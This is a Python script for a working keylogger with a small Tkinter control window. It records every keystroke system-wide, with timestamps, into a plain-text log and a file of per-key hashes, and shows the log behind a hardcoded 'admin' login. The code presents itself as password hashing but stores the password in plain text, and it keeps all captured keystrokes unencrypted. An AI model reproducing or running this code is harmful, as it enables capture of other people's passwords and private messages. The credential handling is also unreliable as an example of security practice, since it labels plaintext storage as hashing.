import os
import hashlib
from datetime import datetime
from pynput import keyboard
import tkinter as tk
import threading
from tkinter import simpledialog, messagebox


MAX_FILE_SIZE_MB = 1  # Maximum file size in MB
MAX_FILE_SIZE_BYTES = MAX_FILE_SIZE_MB * 1024 * 1024 
KEYFILE = "keyfile.txt"
LOG_FILE = "keylog.txt"
PASSWORD_FILE = "password_hash.txt"

# Function to check file size and overwrite if it exceeds the limit
def check_and_overwrite_keyfile():
    if os.path.exists(KEYFILE) and os.path.getsize(KEYFILE) > MAX_FILE_SIZE_BYTES:
        with open(KEYFILE, 'w') as key_file:
            key_file.write("")  # Clear the contents of the file
        print("Key file size exceeded 1 MB. Overwriting the key file.")

# Hash function for key inputs
def hash_key(key_text):
    return hashlib.sha256(key_text.encode()).hexdigest()

def key_pressed(key):
    try:
        # Capture character keys
        key_text = key.char if key.char else f"[{key.name}]"
    except AttributeError:
        key_text = f"[{key}]"
    
    # Log timestamp and key in plain text
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Write to the ASCII log file
    with open(LOG_FILE, 'a') as log_key:
        log_key.write(f"{timestamp} - {key_text}\n")
    
    # Hash the key text
    hashed_key = hash_key(key_text)
    check_and_overwrite_keyfile()
    
    # Write the hashed key to the key file
    with open(KEYFILE, 'a') as key_file:
        key_file.write(f"{timestamp} - {hashed_key}\n")

# Function to start keylogging in a separate thread
def start_keylogger():
    global listener
    listener = keyboard.Listener(on_press=key_pressed)
    listener.start()
    listener.join()

# Function to initialize keylogger on button click
def start_logging():
    logging_thread = threading.Thread(target=start_keylogger, daemon=True)
    logging_thread.start()
    print("Keylogging started.")

# Function to stop keylogging
def stop_logging():
    if listener:
        listener.stop()  # This will stop the listener
        print("Keylogging stopped.")

# Function to load password
def load_password_hash():
    if os.path.exists(PASSWORD_FILE):
        with open(PASSWORD_FILE, 'r') as file:
            return file.read().strip()
    else:
        # Create a new password if the file doesn't exist
        new_password = simpledialog.askstring("Password", "Set a new password:")
        with open(PASSWORD_FILE, 'w') as file:
            file.write(new_password)  # Store plain password
        return new_password

# Function to check login credentials
def check_login(username, password):
    # Simple admin username and password check
    if username == "admin" and password == load_password_hash():
        return True
    return False

# Function to show the log
def show_log():
    username = simpledialog.askstring("Username", "Enter admin username:")
    password = simpledialog.askstring("Password", "Enter admin password:", show='*')
    
    if check_login(username, password):
        with open(LOG_FILE, 'r') as log_key:
            log_data = log_key.read()
        messagebox.showinfo("Log Data", log_data)
    else:
        messagebox.showerror("Error", "Invalid username or password.")

# GUI setup
root = tk.Tk()
root.title("Keylogger Control")

start_button = tk.Button(root, text="Start Logging", command=start_logging)
start_button.pack()

stop_button = tk.Button(root, text="Stop Logging", command=stop_logging)
stop_button.pack()

show_log_button = tk.Button(root, text="Show Log", command=show_log)
show_log_button.pack()

listener = None

root.mainloop()
